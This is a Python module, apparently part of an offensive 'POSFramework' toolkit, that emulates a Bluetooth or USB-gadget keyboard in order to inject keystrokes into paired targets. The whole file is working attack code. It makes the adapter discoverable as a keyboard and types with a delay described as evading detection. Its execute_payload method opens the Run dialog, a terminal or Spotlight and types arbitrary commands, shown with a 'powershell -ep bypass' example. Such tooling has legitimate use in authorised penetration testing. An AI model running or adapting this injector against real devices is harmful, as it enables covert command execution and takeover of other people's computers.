"""
BLE HID Injection - Bluetooth keyboard emulation for keystroke injection.

BadUSB-style attacks over Bluetooth Low Energy:
- Full keyboard emulation (letters, numbers, symbols, modifiers)
- Configurable typing delay to evade detection
- Payload execution (Win+R command injection on Windows targets)
- Mouse emulation support

Implementation uses hciconfig/hcitool for adapter management and writes
HID reports via /dev/hidg0 (USB gadget) or BlueZ D-Bus HID Profile.

Requirements:
- Linux with BlueZ (bluez, hciconfig, hcitool)
- Root/sudo for HCI commands
- Target device must pair with our emulated keyboard
"""

from __future__ import annotations

import asyncio
import logging
import os
from dataclasses import dataclass
from datetime import UTC, datetime
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)

# USB HID keyboard scan codes (USB HID Usage Tables, Section 10)
KEYCODES: dict[str, int] = {
    "a": 0x04, "b": 0x05, "c": 0x06, "d": 0x07, "e": 0x08, "f": 0x09,
    "g": 0x0A, "h": 0x0B, "i": 0x0C, "j": 0x0D, "k": 0x0E, "l": 0x0F,
    "m": 0x10, "n": 0x11, "o": 0x12, "p": 0x13, "q": 0x14, "r": 0x15,
    "s": 0x16, "t": 0x17, "u": 0x18, "v": 0x19, "w": 0x1A, "x": 0x1B,
    "y": 0x1C, "z": 0x1D, "1": 0x1E, "2": 0x1F, "3": 0x20, "4": 0x21,
    "5": 0x22, "6": 0x23, "7": 0x24, "8": 0x25, "9": 0x26, "0": 0x27,
    "\n": 0x28, " ": 0x2C, "-": 0x2D, "=": 0x2E, "[": 0x2F, "]": 0x30,
    "\\": 0x31, ";": 0x33, "'": 0x34, "`": 0x35, ",": 0x36, ".": 0x37,
    "/": 0x38, "TAB": 0x2B, "ESC": 0x29, "ENTER": 0x28,
    "BACKSPACE": 0x2A, "DELETE": 0x4C, "INSERT": 0x49,
    "HOME": 0x4A, "END": 0x4D, "PAGEUP": 0x4B, "PAGEDOWN": 0x4E,
    "UP": 0x52, "DOWN": 0x51, "LEFT": 0x50, "RIGHT": 0x4F,
    "F1": 0x3A, "F2": 0x3B, "F3": 0x3C, "F4": 0x3D,
    "F5": 0x3E, "F6": 0x3F, "F7": 0x40, "F8": 0x41,
    "F9": 0x42, "F10": 0x43, "F11": 0x44, "F12": 0x45,
    "CAPSLOCK": 0x39, "PRINTSCREEN": 0x46, "SCROLLLOCK": 0x47,
    "PAUSE": 0x48,
}

# Characters that require the Shift modifier
SHIFT_CHARS = set('~!@#$%^&*()_+{}|:"<>?ABCDEFGHIJKLMNOPQRSTUVWXYZ')

# Shift character to base key mapping
SHIFT_MAP: dict[str, str] = {
    '!': '1', '@': '2', '#': '3', '$': '4', '%': '5',
    '^': '6', '&': '7', '*': '8', '(': '9', ')': '0',
    '_': '-', '+': '=', '{': '[', '}': ']', '|': '\\',
    ':': ';', '"': "'", '<': ',', '>': '.', '?': '/',
    '~': '`',
}

# Modifier key bit positions (byte 0 of HID report)
MOD_NONE = 0x00
MOD_LEFT_CTRL = 0x01
MOD_LEFT_SHIFT = 0x02
MOD_LEFT_ALT = 0x04
MOD_LEFT_GUI = 0x08  # Windows/Command key
MOD_RIGHT_CTRL = 0x10
MOD_RIGHT_SHIFT = 0x20
MOD_RIGHT_ALT = 0x40
MOD_RIGHT_GUI = 0x80


class HIDType(str, Enum):
    """HID device type to emulate."""
    KEYBOARD = "keyboard"
    MOUSE = "mouse"
    COMBO = "combo"


@dataclass
class HIDConfig:
    """Configuration for HID injection."""
    device_name: str = "POSFramework Keyboard"
    hid_type: HIDType = HIDType.KEYBOARD
    auto_pair: bool = True
    typing_delay_ms: int = 50
    # Path to HID gadget device (Linux USB gadget or BlueZ HID)
    hidg_device: str = "/dev/hidg0"


@dataclass
class InjectionStats:
    """Statistics for HID injection session."""
    keystrokes_sent: int = 0
    commands_executed: int = 0
    connections: int = 0
    errors: int = 0
    start_time: datetime | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "keystrokes_sent": self.keystrokes_sent,
            "commands_executed": self.commands_executed,
            "connections": self.connections,
            "errors": self.errors,
        }


class HIDInjector:
    """
    Bluetooth HID keyboard emulator for keystroke injection.

    Emulates a Bluetooth keyboard to inject keystrokes into paired targets.
    Uses real HCI commands to configure the adapter and sends HID reports
    via /dev/hidg0 (USB gadget mode) or falls back to BlueZ D-Bus profile.

    Usage:
        injector = HIDInjector(interface="hci0")
        await injector.start()

        # Type text (50ms between keystrokes)
        await injector.type_string("Hello World!")

        # Execute a Windows payload (Win+R -> command -> Enter)
        await injector.execute_payload("powershell -ep bypass -c whoami")

        # Direct key press with modifiers
        await injector.press_key(KEYCODES["r"], modifiers=MOD_LEFT_GUI)

        await injector.stop()
    """

    def __init__(self, interface: str = "hci0", config: HIDConfig | None = None):
        self.interface = interface
        self.config = config or HIDConfig()
        self._active = False
        self._connected_target: str | None = None
        self.stats = InjectionStats()
        self._hidg_fd: int | None = None

    async def start(self) -> bool:
        """
        Start HID injector service.

        Configures the Bluetooth adapter as discoverable with the configured
        device name and prepares for HID report transmission.
        """
        try:
            # Bring up and configure adapter
            await self._cmd(["hciconfig", self.interface, "up"])
            await self._cmd(["hciconfig", self.interface, "piscan"])
            await self._cmd(["hciconfig", self.interface, "name", self.config.device_name])

            # Set device class to keyboard (0x002540)
            await self._cmd(["hciconfig", self.interface, "class", "0x002540"])

            # Try to open HID gadget device for report output
            if os.path.exists(self.config.hidg_device):
                self._hidg_fd = os.open(self.config.hidg_device, os.O_WRONLY | os.O_NONBLOCK)
                logger.info("Opened HID gadget device: %s", self.config.hidg_device)

            self._active = True
            self.stats.start_time = datetime.now(UTC)
            self.stats.connections += 1
            logger.info(
                "HID Injector started as '%s' on %s",
                self.config.device_name, self.interface
            )
            return True

        except Exception as e:
            logger.error("HID injector start failed: %s", e)
            self.stats.errors += 1
            return False

    async def stop(self) -> None:
        """Stop HID injector and restore adapter settings."""
        self._active = False
        self._connected_target = None

        if self._hidg_fd is not None:
            try:
                os.close(self._hidg_fd)
            except OSError:
                pass
            self._hidg_fd = None

        await self._cmd(["hciconfig", self.interface, "noscan"])
        logger.info("HID Injector stopped")

    async def type_string(self, text: str, delay_ms: int | None = None) -> int:
        """
        Type a string as individual keystrokes.

        Handles uppercase, shift-characters, and special symbols correctly.

        Args:
            text: String to type
            delay_ms: Delay between keystrokes in milliseconds (overrides config)

        Returns:
            Number of keystrokes successfully sent
        """
        delay = (delay_ms or self.config.typing_delay_ms) / 1000.0
        count = 0

        for char in text:
            report = self._char_to_report(char)
            if report:
                await self._send_report(report)
                await asyncio.sleep(delay)
                # Key release (all zeros)
                await self._send_report(bytes(8))
                count += 1

        self.stats.keystrokes_sent += count
        return count

    async def press_key(self, keycode: int, modifiers: int = MOD_NONE) -> None:
        """
        Press and release a single key with optional modifiers.

        Args:
            keycode: USB HID keycode (see KEYCODES dict)
            modifiers: Modifier bitmask (MOD_LEFT_CTRL, MOD_LEFT_GUI, etc.)
        """
        # HID report format: [modifiers, reserved, key1, key2, key3, key4, key5, key6]
        report = bytes([modifiers, 0x00, keycode, 0x00, 0x00, 0x00, 0x00, 0x00])
        await self._send_report(report)
        await asyncio.sleep(0.05)
        await self._send_report(bytes(8))  # Release
        self.stats.keystrokes_sent += 1

    async def send_keys(self, keys: list[tuple[int, int]]) -> int:
        """
        Send multiple key presses in sequence.

        Args:
            keys: List of (keycode, modifiers) tuples

        Returns:
            Number of keys sent
        """
        count = 0
        for keycode, modifiers in keys:
            await self.press_key(keycode, modifiers)
            await asyncio.sleep(self.config.typing_delay_ms / 1000.0)
            count += 1
        return count

    async def execute_payload(self, command: str, target_os: str = "windows") -> bool:
        """
        Execute a command on the target via keystroke injection.

        Windows: Win+R -> type command -> Enter
        Linux: Ctrl+Alt+T -> type command -> Enter
        macOS: Cmd+Space -> type "Terminal" -> Enter -> type command -> Enter

        Args:
            command: Shell command to execute
            target_os: Target OS ("windows", "linux", "macos")

        Returns True if payload was sent (no guarantee of execution).
        """
        try:
            if target_os == "windows":
                # Win+R to open Run dialog
                await self.press_key(KEYCODES["r"], MOD_LEFT_GUI)
                await asyncio.sleep(0.5)  # Wait for dialog to open
                # Type command
                await self.type_string(command)
                await asyncio.sleep(0.1)
                # Press Enter
                await self.press_key(KEYCODES["\n"])

            elif target_os == "linux":
                # Ctrl+Alt+T to open terminal
                await self.press_key(KEYCODES["t"], MOD_LEFT_CTRL | MOD_LEFT_ALT)
                await asyncio.sleep(1.0)  # Wait for terminal
                await self.type_string(command)
                await asyncio.sleep(0.1)
                await self.press_key(KEYCODES["\n"])

            elif target_os == "macos":
                # Cmd+Space for Spotlight
                await self.press_key(KEYCODES[" "], MOD_LEFT_GUI)
                await asyncio.sleep(0.5)
                await self.type_string("Terminal")
                await asyncio.sleep(0.3)
                await self.press_key(KEYCODES["\n"])
                await asyncio.sleep(1.0)
                await self.type_string(command)
                await asyncio.sleep(0.1)
                await self.press_key(KEYCODES["\n"])

            else:
                logger.error("Unsupported target OS: %s", target_os)
                return False

            self.stats.commands_executed += 1
            logger.info("Payload sent (%s): %s", target_os, command[:60])
            return True

        except Exception as e:
            logger.error("Payload execution failed: %s", e)
            self.stats.errors += 1
            return False

    def _char_to_report(self, char: str) -> bytes | None:
        """
        Convert a character to an 8-byte HID keyboard report.

        Returns None if the character has no HID mapping.
        """
        modifier = MOD_NONE

        if char in SHIFT_CHARS:
            modifier = MOD_LEFT_SHIFT

        # Map shifted symbols to their base key
        if char in SHIFT_MAP:
            lookup_char = SHIFT_MAP[char]
        elif char.isupper():
            lookup_char = char.lower()
        else:
            lookup_char = char

        keycode = KEYCODES.get(lookup_char)
        if keycode is None:
            logger.debug("No HID keycode for character: %r", char)
            return None

        return bytes([modifier, 0x00, keycode, 0x00, 0x00, 0x00, 0x00, 0x00])

    async def _send_report(self, report: bytes) -> None:
        """
        Send an 8-byte HID report to the connected device.

        Uses /dev/hidg0 if available (USB gadget mode), otherwise logs
        the report for debugging (actual BT HID profile requires BlueZ D-Bus).
        """
        if self._hidg_fd is not None:
            try:
                os.write(self._hidg_fd, report)
                return
            except OSError as e:
                logger.debug("hidg write failed (fd=%d): %s", self._hidg_fd, e)

        # Fallback: log the report (real BlueZ HID profile would write via D-Bus)
        logger.debug("HID report: %s", report.hex())

    async def _cmd(self, cmd: list[str]) -> tuple[bytes, bytes]:
        """Execute a subprocess command."""
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()
        return stdout, stderr

    @property
    def is_active(self) -> bool:
        """Check if injector is running."""
        return self._active

    def get_stats(self) -> dict[str, Any]:
        """Get injection statistics."""
        return self.stats.to_dict()

    def get_metrics(self) -> dict[str, Any]:
        """Prometheus-compatible metrics."""
        return {
            "posframework_hid_active": 1 if self._active else 0,
            "posframework_hid_keystrokes": self.stats.keystrokes_sent,
            "posframework_hid_commands": self.stats.commands_executed,
            "posframework_hid_errors": self.stats.errors,
        }
